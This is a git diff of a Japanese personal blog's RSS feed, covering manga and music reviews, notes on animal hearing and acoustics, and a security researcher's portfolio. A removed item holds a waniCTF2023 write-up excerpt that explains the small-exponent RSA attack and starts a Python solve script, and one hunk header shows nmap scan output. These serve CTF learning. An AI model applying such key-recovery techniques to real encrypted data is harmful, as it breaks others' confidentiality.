序盤の戦争勃発みたいな話をこの時代に想像できていたのマジで手塚治虫すぎる 大和編 殉死の尊さと命の尊さが逆転したのってどれくらいの時期なんだろう 宇宙編 流刑星の救われなさ こういう強烈な環境と「なれの果て」みたいなのを描くのうますぎるな 火の鳥はフレミルの民族ってことなのか？ でも牧村がフレミルを虐殺しているときにフレミルはちゃんと死んでいるから永遠の命をもっているのはコンタクトをとってきたフレミルだけなんだよな 一方でフレミルが以前人間の姿で登場したときはこの容姿だったように思える 顔が醜くなったのは黎明編の猿田彦に似てるな 鳳凰編 復活編・羽衣編 望郷編 乱世編 生命編 異形編 太陽編 ゴッドファーザーの息子 ゴッドファーザーの息子 全くタイプの違う友人ができることはよくある バンカラが特攻で死んでしまうのはしんみりする 紙の砦 終戦した喜びと，残り続ける戦争の禍根がまざまざと描かれている 大寒の彼女がオペラ歌手の夢を断念せざるを得なくなる悲しさ ノーマン 月のクレーターが実は戦争の遺恨だったという設定 異星人の設定を考えるのがいつもうまい マグマ大使とか海のトリトンは「え？」みたいな話の進み方が多かったけど今回はある程度納得する進み方でよかった 総員玉砕せよ 人間はシンプルに描かれているのに対して背景が異常に丁寧に描かれていてリアリティがある 息がある仲間の小指を切り落として持ち帰るシーンとかも，雨に打たれながら異国で不本意に死んでいくナンセンスさを感じる 上官の意思とかエゴでで人間が死ぬのは救われないのはそうだけれど「戦争だというのにリクツばかりいうな」みたいなセリフは感じるものがある 劇画ヒットラー 史実としては信用してないし，若干読みづらい 行間を文字で埋めているのでしょうがない ヒトラーがどうして民主主義を守りながら独裁政権を確立したのか？ ヒトラーが「全権委任法」を成立させたから しかし，これは当作品にもあるように，ほとんど脅迫のような雰囲気で成立した． ヒトラーに反対するような共産党議員，社会民主党議員は既に逮捕されていたため，投票の場にすら出席できなかった． この全権委任法によってヒトラーはほとんど自由に法律を作ることができるようになった(ここは理解が怪しい) これにより国会は形骸化，議会制民主主義が消え，実質的にワイマール憲法が廃止したことになる ヒトラーの周囲には貧困が蔓延っている 一方で，ヒトラーのように「自分が不幸だから周囲も不幸であるべき」と思うかどうかはその人の精神によるものだと思う 選挙行こうと思った ビッグX 飽きたのがアリアリと伝わる 雨ふり小僧 雨ふり小僧 確か後期の作品 絵柄が安定していてめちゃくちゃカワイイ 最後まで待つ雨ふり小僧けなげすぎるだろ るんは風の中 カラッとしつつも湿度高めのSF こういうのいいよな 現代マンガ選集(異形編) ポーチで少女が小犬と 萩尾望都の SF を初めて読んだ あっさりしていて面白い 「COM」に掲載されていたらしい 火の鳥のページ埋めに掲載したらしいけど埋めどころか主役級だと思う アカプルコ・ゴールド 吉田秋生の絵は良い 新しいものに飛び付くのはやめられない．．． サイボーグ 水木しげるにしてはあっさりしてるように思う ぼくとフリオと校庭で マジでいい フリオどこいっちゃったんだよ．．． ナンバー7 イラストが安定し始めたような気がする 最後飽きすぎだろ 百物語 ロロの旅路 悲しすぎる 犬とかオオカミを描かせるとマジでかわいいな 荒野の七ひき これは面白い 架空の宇宙人の特性とかめちゃくちゃアイデア湧いてくるんだろうな 安達が原 アンニー&amp;hellip; 「アンニー!</description>
     </item>
     
     <item>
@@ -485,10 +206,10 @@ enum nmap PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ss
     
     <item>
       <title>音楽生成2</title>
-      <link>http://side-realms.github.io/sound/ml3/</link>
+      <link>http://side-realms.github.io/misc/ml3/</link>
       <pubDate>Sun, 03 Dec 2023 13:41:49 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/ml3/</guid>
+      <guid>http://side-realms.github.io/misc/ml3/</guid>
       <description>名誉伝説のドラム上手くないですか？
 導入 前回の音楽生成の続き
 この本の目次を読んで自分で実装してみる
@@ -501,10 +222,10 @@ import matplotlib.pyplot as plt import numpy as np import pandas as pd import te
     
     <item>
       <title>音楽生成</title>
-      <link>http://side-realms.github.io/sound/ml2/</link>
+      <link>http://side-realms.github.io/misc/ml2/</link>
       <pubDate>Sat, 02 Dec 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/ml2/</guid>
+      <guid>http://side-realms.github.io/misc/ml2/</guid>
       <description>中華ホラーにハマってる
 たまにシャレにならない怖さのものがあって興奮する
 導入 いい本があった
@@ -535,10 +256,10 @@ $f$ の活性化関数は，例えばステップ関数なら 0, 1 を出力す�
     
     <item>
       <title>HAPPY END</title>
-      <link>http://side-realms.github.io/sound/happyend/</link>
+      <link>http://side-realms.github.io/misc/happyend/</link>
       <pubDate>Wed, 08 Nov 2023 08:39:04 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/happyend/</guid>
+      <guid>http://side-realms.github.io/misc/happyend/</guid>
       <description>はっぴいえんどのラストアルバム． 解散が決まってからロサンゼルスで収録された作品で，その影響かこれまでのアルバムと比較して西海岸のカラッとした印象をうける． 松本は解散に賛成していなかったらしく，今回のアルバムでは鈴木茂以外に歌詞を提供することを断ったという． そうとうギクシャクしているはずだし，本アルバムのアートワークも本来は4人の写真を撮るはずだったがそれすらできないほど精神状態が安定していなかったという． かと言ってクオリティが低いわけではなく，素敵で聞きやすい曲が多い． でも当時の写真とか見てもそんなに仲悪そうな感じはしないけどどうだったんだろうな．
 松本が歌詞を提供しなかったのは必ずしも悪いことだけではなくて， 細野の相合傘とか大瀧の田舎道とかこれからの彼らのソロワークの布石みたいになっているような気もする（大瀧はこの時点ですでにソロデビューしていたが．．．）
 あとやっぱり特筆すべきは鈴木の作品が多いことだと思う． 前作では一曲しか提供していなかった鈴木が今回は3曲も提供している．
@@ -570,10 +291,10 @@ HOSONO HOUSE に通じるものを感じる． 細野のベースが常に動い
     
     <item>
       <title>風街ろまん</title>
-      <link>http://side-realms.github.io/sound/happyend1/</link>
+      <link>http://side-realms.github.io/misc/happyend1/</link>
       <pubDate>Fri, 22 Sep 2023 22:57:54 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/happyend1/</guid>
+      <guid>http://side-realms.github.io/misc/happyend1/</guid>
       <description>風街ろまんの感想をいまさら文章にしてみる
 1. 抱きしめたい 作曲は大瀧詠一，作詞は松本隆で，ギターソロは鈴木茂． 颱風とはいから・びゅーちふる以外は松本が作詞を担当している．
 主人公が「君」に会いに汽車に乗って出かける話． 「君」が恋人なのか宮沢賢治なのか（松本隆は宮沢賢治に作詞の影響をうけているが， それが最もあらわれているのがこの「抱きしめたい」だと語っていた）は分からないけど 誰かに会いに行っている．
@@ -750,6 +471,15 @@ protected synchronized int next(int bits) { seed = (seed * 0x5DEECE66DL + 0xBL) 
     </item>
     
     <item>
+      <title>Portfolio</title>
+      <link>http://side-realms.github.io/portfolio/</link>
+      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/portfolio/</guid>
+      <description>Event 技術書展 2024 出展 セキュリティミニキャンプ三重 2023 チューター OWASP ZAP とその改造 マルウェア解析 セキュリティミニキャンプ東京 2023 講師 サイドチャネル攻撃 セキュリティキャンプ 2023 X トラック チューター 無線ハック セキュリティミニキャンプオンライン 2022 講師 サイドチャネル攻撃 CODE BLUE 2022 学生スタッフ セキュリティキャンプ 2022 X トラック チューター 無線ハック セキュリティキャンプ 2021 X トラック修了 ハードウェアハック Publication (査読あり) K. Doi and T. Sugawara, “Laser-based Covert Channel Attack Using Inaudible Acoustic Leakage from Multilayer Ceramic Capacitors,” IEICE Trans. Fundamentals K. Doi, K. Ooi, and T. Sugawara, “Acoustic Eavesdropping Attack Using Self-Mixing Laser Interferometer,” ASHES 2024.</description>
+    </item>
+    
+    <item>
       <title>shader programming</title>
       <link>http://side-realms.github.io/other/shader-programming/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
@@ -768,24 +498,10 @@ protected synchronized int next(int bits) { seed = (seed * 0x5DEECE66DL + 0xBL) 
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
       <guid>http://side-realms.github.io/treasure/</guid>
-      <description>｢あ｣｢え｣｢お｣っていう奴 random.dog 柴犬がすき
+      <description>wo ai ni~~ ｢あ｣｢え｣｢お｣っていう奴 random.dog 柴犬がすき
 Eclair De Lune 12:27 よくまとまっていてすごい．新しい曲を知りたいときに参照する
 DON PA PPO / ガチ恋ぽんぽこ【MV】 ニセコイラジオ 一生聞いてた(る)
 俺ガイル 助けてくれ</description>
-    </item>
-    
-    <item>
-      <title>waniCTF2023</title>
-      <link>http://side-realms.github.io/writeup/wanictf2023/</link>
-      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/wanictf2023/</guid>
-      <description>初心者~中級者の CTF ．個人参加．beginner は全解きしたいのきもちで挑んだが分かりやすい問題が多くて色んな技術にスムーズに入門することができた． これを機に CTF 入門していきたいきもち
-waniCTF2023
-official writeup
-crypto EZDORSA_Lv1 ChatGPT に入れたらできた．すげえ～
-EZDORSA_Lv2 e が小さいので RSA の運用的にまずい．RSA の暗号化において $C=M^e\mod N$ だが，ここで $e$ が小さいと $M^e$ も小さくなる． このとき $M &amp;lt; \sqrt[e]{N}$ なら，$M^e &amp;lt; N$ より $\mod N$が関係なくなる． すると $C=M^e$ になるので，$M = \sqrt[e]{C}$ でもとまる
-import gmpy2 from Crypto.Util.number import * # 提供されたoutput.txtの内容 n = 25465155563758206895066841861765043433123515683929678836771513150236561026403556218533356199716126886534636140138011492220383199259698843686404371838391552265338889731646514381163372557117810929108511770402714925176885202763093259342499269455170147345039944516036024012941454077732406677284099700251496952610206410882558915139338028865987662513205888226312662854651278789627761068396974718364971326708407660719074895819282719926846208152543027213930660768288888225218585766787196064375064791353928495547610416240104448796600658154887110324794829898687050358437213471256328628898047810990674288648843902560125175884381 e = 7 c = 25698620825203955726406636922651025698352297732240406264195352419509234001004314759538513429877629840120788601561708588875481322614217122171252931383755532418804613411060596533561164202974971066750469395973334342059753025595923003869173026000225212644208274792300263293810627008900461621613776905408937385021630685411263655118479604274100095236252655616342234938221521847275384288728127863512191256713582669212904042760962348375314008470370142418921777238693948675063438713550567626953125 tmp = pow(5, 100, n) c = c // tmp print(tmp) print(c) m,result = gmpy2.</description>
     </item>
     
     <item>
@@ -803,10 +519,10 @@ _get_running_window() で開いているウィンドウ(プロセス)の情報�
     
     <item>
       <title>フォルマント解析</title>
-      <link>http://side-realms.github.io/sound/formants/</link>
+      <link>http://side-realms.github.io/misc/formants/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/formants/</guid>
+      <guid>http://side-realms.github.io/misc/formants/</guid>
       <description>フォルマント解析，やってみたいよな
 フォルマント 人間の音声は声帯の振動で生成され，声道を通って発せられる． このとき，声道の周波数特性によって，特定の周波数が強調される． この強調された周波数をフォルマント周波数といい， 低いものから順番に第一フォルマント，第二フォルマント・・・という
 下図は IA に「あいうえお」ってしゃべらせたときの波形
@@ -827,10 +543,10 @@ $$\overline{x_n} = x_n - \epsilon_n = - \alpha_n * x_n$$</description>
     
     <item>
       <title>レコード</title>
-      <link>http://side-realms.github.io/sound/record/</link>
+      <link>http://side-realms.github.io/misc/record/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/record/</guid>
+      <guid>http://side-realms.github.io/misc/record/</guid>
       <description>レコードは音質が良いって聞くけどあんまり信用していない
 レコードの仕組み レコード盤には音波を記録した溝が彫られているが， この溝をレコード針が動くことでカートリッジに振動が伝わる． この振動を電気信号に変換し，アンプで増幅することで音になる． まあこれはいいんだけど，ステレオ再生ができる理由が分かっていない．
 従来のモノラル再生は針が左右に動くだけで振動をトレースしている． で，さらにステレオ再生するにはもう一つの情報が必要なので， 単に針を増やす方法が考えられた．しかしこれは同期や信号処理部の難しさなどで発展しなかった． 今使われているのは 45/45 方式というもので，レコードの溝の左右にそれぞれのステレオ音を保存する． こうすると溝に対して 45 度に振動するので，一本の針でステレオを保存できる．
@@ -843,10 +559,10 @@ MM, MC カートリッジは高周波であればあるほど電圧が高くな�
     
     <item>
       <title>両生爬虫類</title>
-      <link>http://side-realms.github.io/sound/amphibian_reptile/</link>
+      <link>http://side-realms.github.io/misc/amphibian_reptile/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/amphibian_reptile/</guid>
+      <guid>http://side-realms.github.io/misc/amphibian_reptile/</guid>
       <description>カエル好きやねん
 基本的な聴覚特性 基本的に両生爬虫類は低音側に感度をもつ． 具体的には 1 kHz 以下周辺芋高い感度を持つ． だからといって，超音波領域に感度がないわけではない． 例えば，渓流にすむカエルなどは，渓流ノイズを避けるために 高周波側でコミュニケーションをとるように進化した．
 耳の形についても，両生爬虫類は耳介を持たないことで知られている． また，鼓膜をもつものも限られており，加えてほとんどのカメと一部のカエルなどは鼓膜が露出している． 哺乳類の耳小骨とは違い，両生爬虫類は1つの耳小骨と耳小柱しかもたない．
@@ -864,10 +580,10 @@ MM, MC カートリッジは高周波であればあるほど電圧が高くな�
     
     <item>
       <title>人間の音声</title>
-      <link>http://side-realms.github.io/sound/voice/</link>
+      <link>http://side-realms.github.io/misc/voice/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/voice/</guid>
+      <guid>http://side-realms.github.io/misc/voice/</guid>
       <description>人間の発声 声を出そうとすると，左右の声帯が中央に寄る． 同時に肺からの呼気が声門を通り抜けると，狭くなった声帯を呼気が通り抜けて口に流れる 呼気が狭いところを流れると，広いところを流れる時より圧力が高くなるので(ベルヌーイの法則)，声門が一時的に閉じる． でも呼気は出続けるので，圧力に負けて声門がもう一度開く また同じようにして閉じる，開くを繰り返すので，声門から出力される空気の密度に濃淡ができる 濃淡が音波の縦波として伝わる 周波数は声門が開閉する回数，振幅は声門の開き幅，音色は声門の性質(どれくらい上手に開閉できるかとか，口腔や咽頭の形・容積とか)に対応している．
 音響特性(あかさたな，とかの違い)は音色に対応している，口腔の形とか 鼻腔との接続があって母音・子音がつくられる． 生後すぐには構音はできず，喃語を通して発声器官を制御できるようになる．
 しかし口腔や鼻腔に損傷があると発声障害になる．歯や感覚異常も同様． また，脳はもちろん，難聴も発声に影響する．つまり，自分の声をモニタリングできないので フィードバック制御ができなくなる．
@@ -889,10 +605,10 @@ delayed auditory feedback：自信の声にディレイをかけてフィード�
     
     <item>
       <title>分子</title>
-      <link>http://side-realms.github.io/sound/molecule/</link>
+      <link>http://side-realms.github.io/misc/molecule/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/molecule/</guid>
+      <guid>http://side-realms.github.io/misc/molecule/</guid>
       <description>可聴化 可聴化という分野があるらしい． 視覚的に得られる情報よりも聴覚的に得られる情報の方が意味をもつことがある，みたいな考えがあるらしい． 機械の異音をベテランが察知するみたいなかんじだろうか． たしかに聴覚はいろんな情報を一度に受容できる，みたいな話は聞いたことがある． 視覚と比べてインテグラルに情報を得ることができる，という意味だと思うが， 得たい情報によって話が変わるような気もする．
 ガイガーカウンタはこうした可聴化の試みの一つ． ガイガーカウンタは放射線物質が崩壊するときに飛んでくる粒子や電磁波の個数をカウントするもの． 高い電圧が印加されたガスに放射線が通過するとガスが電離するので，それによって生じた電子で放射線量を 測定する． このとき通過した放射線量をパルスの音に変化すれば，音の粗密で放射線量を 聴覚的に知ることができる． エネルギーとはまた別で，単に個数を数えている． 他にもヒッグス粒子の出現と配置を音に変換したものも存在するらしい． (soundcloud)
 どうやって変換するのか，みたいな変形部分の考え方で色々議論があるらしい． 今回の分子の音も可聴化に関すること
@@ -909,10 +625,10 @@ delayed auditory feedback：自信の声にディレイをかけてフィード�
     
     <item>
       <title>哺乳類</title>
-      <link>http://side-realms.github.io/sound/bat/</link>
+      <link>http://side-realms.github.io/misc/bat/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/bat/</guid>
+      <guid>http://side-realms.github.io/misc/bat/</guid>
       <description>コウモリ コウモリはオオコウモリとコウモリに分類されるが，エコーロケーションをしているのはコウモリである． オオコウモリは視覚で定位している． コウモリはなんで超音波が出せるのか気になるが，基本的な部分は人間と同じで， 咽頭筋肉の高速コントロールができているから，ということらしい．
 コウモリのエコーロケーションには二種類あり，FM だけの信号と CF-FM 信号がある． 定常周波数をもつ CF のあとに FM を流すパターンと FM だけの二つ． CF 部分の長さや FM の長さによってエコーロケーションの種が変化する． 周波数が互いに混信することもあるが，これは互いに自身の周波数を調整することで回避している．
 イルカ イルカは声帯を持たず，その鳴き声はパルス音と連続音(クリックスとホイッスル)に分別される． 音源が何か，ということは議論されているが，噴気孔周辺であると信じられている．例えば クリックスは噴気孔で圧縮された呼気が鼻道を通り，脂肪嚢を振動させることで発音されると知られている． しかし，この周波数の調整方法などは解明されていない．
@@ -930,10 +646,10 @@ delayed auditory feedback：自信の声にディレイをかけてフィード�
     
     <item>
       <title>植物</title>
-      <link>http://side-realms.github.io/sound/seedling/</link>
+      <link>http://side-realms.github.io/misc/seedling/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/seedling/</guid>
+      <guid>http://side-realms.github.io/misc/seedling/</guid>
       <description>植物と振動 植物が振動に伴って成長速度を変化させることは知られている． 例えば，ロイヌナズナは，モンシロチョウの幼虫による葉の摂食を，振動を通じて認識している． これにより，化学防御物質を出すことで，防御反応を示す． これは，風や他の昆虫の振動では全く反応しない． また，食虫植物とかは振動で獲物を獲得している．
 こうした攻めの検知以外にも，例えば羽音を聞いたら，花蜜を積極的に増やすこともある． こうすることで，花粉の輸送を促進する． また，コウモリに花粉の輸送を依頼している植物は，その超音波を検知している． 特に，この検知に特化して受け皿(皿葉)をもっている
 機械感覚 例えばオジギソウは，摂食があると反応する． こんなかんじで，機械刺激を感じることができる． ヒマワリが太陽の方を向いたり，海岸沿いの近くに生えた木は風下に向かって伸びるなどもこれ．
@@ -942,10 +658,10 @@ delayed auditory feedback：自信の声にディレイをかけてフィード�
     
     <item>
       <title>虫</title>
-      <link>http://side-realms.github.io/sound/bug/</link>
+      <link>http://side-realms.github.io/misc/bug/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/bug/</guid>
+      <guid>http://side-realms.github.io/misc/bug/</guid>
       <description>発音 昆虫はめちゃめちゃ小さいけどすごく大きな音を出すのすごいよな，っていう&amp;hellip; 魚類と同じように，遠距離では減衰しにくい音圧，近距離は減衰しやすい粒子速度が使われている．
 摩擦
 例えばコオロギは硬い表皮を持っているが，この方さにより特有の摩擦器官をもつ． 片方の翅にはギザギザがあるが，一方の翅には摩擦片とこすり合わせることで音が出る． このヤスリの部分のギザギザの個数やこすり合わせる速度によって周波数が変化し， 種類によっては 120 kHz までの音を出すものも存在する． こういった音が翅に共振して，遠くまで届く．コオロギだけでなくてもアリやガなども摩擦器官をもつ． また，翅にも限らない． 振動膜
@@ -977,10 +693,10 @@ Vtuber を狂ったように見ていた． 特にぽこピー・ミミック・
     
     <item>
       <title>魚類</title>
-      <link>http://side-realms.github.io/sound/fish/</link>
+      <link>http://side-realms.github.io/misc/fish/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/fish/</guid>
+      <guid>http://side-realms.github.io/misc/fish/</guid>
       <description>魚類の聴覚 水中では，音は縦波の圧縮波として音圧を，近距離では水粒子の動きとして感知される． 魚類も同様に聴覚があり，内耳を用いて圧縮波を感知する一方で，近距離の水粒子の動きを側線で感知する． 魚の内耳は，一方で蝸牛がない．三半規管の下に配置されている3つの嚢の中に有毛細胞が存在し， それぞれが耳石と連携している． 音によって魚の体が振動するが，耳石は魚の本体と比べて比重が3倍大きいので，その振動から位相が遅れる． このずれが有毛細胞全体を倒すことになり，チャネルが開く． これとは別に、鰾を使って音を感知できる魚類もいる． つまり，鰾が内耳とつながっていて，音圧によってこの鰾が振動する． このように，鰾を使うと音の圧力変化(スカラー量)をよく感知することができる． つまり，遠距離からの音圧を感知することができる 一方で，鰾が内耳と連携していない魚類は，前述のとおりベクトル成分しか感知することができない． つまり近距離の粒子運動しか感知することができない．
 人間など陸上動物が鼓膜を使うことができる理由は，空気よりも音響インピーダンスが高い 肉体をもつためである． この肉体に固定された鼓膜の振動として，音をスムーズに感知することができる． 一方で，魚は水と音響インピーダンスの差がほとんどない． そこで，耳石が使われることになる． 多くの魚の周波数感度は低く，おおむね 2 kHz 以下の周波数帯域である．
 音源定位 魚は音源の位置が学習できなかったという報告(ハヤ)がある一方で， 威嚇音を使った追い込み漁や，求愛のために魚が音を発する例もある． 実際には水平方向，垂直方向に識別できることが知られている．
@@ -994,10 +710,10 @@ Vtuber を狂ったように見ていた． 特にぽこピー・ミミック・
     
     <item>
       <title>鳥類</title>
-      <link>http://side-realms.github.io/sound/bird/</link>
+      <link>http://side-realms.github.io/misc/bird/</link>
       <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/bird/</guid>
+      <guid>http://side-realms.github.io/misc/bird/</guid>
       <description>鳴禽類 鳴禽類は例えば雀やカナリアなどの鳥類で，二種類の音声で鳴く． 一つは地鳴きといい，警戒音など生まれつき発生することができる音声がある． 二つ目はソングといい，複数の音がある規則に従って連なる音声のことをいう． 求愛や縄張り争いに使われ，幼鳥期に会得する．幼鳥期は歌を学習する必要があるが，それは二段階に分かれている． 最初は感覚学習期といい，お手本となる歌を聴いて自信の記憶を形成する． 次に感覚運動学習期では，その歌を実現しようと練習する． 人間と同じで自分の発声とそのフィードバックを得て修正を繰り返しながら発声を練習する． ジュウシマツとコシジロキンパラはその学習過程でよく比較されるが，ジュウシマツとコシジロキンパラはその文法学習に差がある． ジュウシマツは音素を複雑に構成して歌を形成する． しかしその歌は規則性があるわけではなく，音素を組み替えて歌うことができる． 一方でコシジロは規則的な・単調な歌しか歌えない． これは里親を変更したときは両鳥ともに単調な歌しか歌えなかったので，ジュウシマツにしか学習能力がないことがわかる． 一方で，鳴禽類以外の鳥は内耳を切除しても普段通りの鳴き声を実現したものもある． そのため，学習せずに遺伝子的に鳴く鳥もある
 フクロウ フクロウは当然夜行性なので，優れた視覚と聴覚をもつ．そのために音源定位が必要． 例えばメンフクロウは音の方向に対して顔を向ける性質があるが，これを利用してメンフクロウの 音源定位を調査できる． これを利用するとフクロウの音源定位は人間よりも精度がよく，数度でわかるらしい．すご
 フクロウの音源定位のよさは耳の位置による．特にメンフクロウは左耳が右耳よりも高い位置にあり， 左耳は下向きに，右耳は上向きについている．
@@ -1009,6 +725,15 @@ Vtuber を狂ったように見ていた． 特にぽこピー・ミミック・
 ところで，歌には方言があることが知られている． 大陸では数十キロごとに歌に変化がある．同じ周波数でも規則性が違ったり， 周波数さえ違うこともある． 日本でも同じような現象が見られ，本土と島嶼や島嶼ごとに方言のような差異がみられる． これには環境の変化などが理由に上がる． 例えば，本土は季節ごとにそのなわばりを移動するため，その頻度が多いが， 島嶼の鳥は季節的な移動がないため，なわばり争いの頻度も少ない． また，本土は繁殖失敗の要素が多く(敵の存在)，性淘汰に対する圧力が大きいが， 島嶼はそうではない． あるいは，どんな種類の鳥類がいるか，ということも方言を生み出している． 例えば自分のソングに似た鳥類が周りにいると，不必要な争いに巻き込まれる可能性がある． そこで，方言的にソングを変えることでこうした争いを減らしている． こうした理由が地域差を生み出していると考えられている． このような方言が種別化を生み出すことがあるか，という点は議論されているらしい． おもろ
 方言とは関係なく，鳥類はその環境に応じてその鳴き声を適応させる． 例えば騒音がうるさい都市では，そのソングの周波数・音圧・鳴く時間を適応させることが知られている． また，森林では低周波が減衰されにくいため，森林にすむ鳥は低周波の純音を使用する傾向にある．
 加齢によって歌は変化する． 経験を重ねるにつれて，歌学習をする鳥類は歌のれぱーとりーが増えたり， 周波数幅や速度の上昇などがみられる．こういった要素からメスはオスの年齢を指標とする． 一方で，加齢によって歌の速度や周波数幅が減少する種別もみられる． こういった歌の加齢による変化は，ないと考えられていた． 幼鳥期のみに歌学習がおこるからである． しかし，こうした加齢によって歌が変化することは減少として確認されており， こうした可塑性がどれほどあるのか，コミュニケーションや社会にどのような 影響を及ぼしているのか，などはほとんどわかっていないらしい．</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>http://side-realms.github.io/techblog/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://side-realms.github.io/techblog/</guid>
+      <description>Techblog Hardware Hacking Lab cryptography Low Layer machine learning Container Writeup </description>
     </item>
     
   </channel>
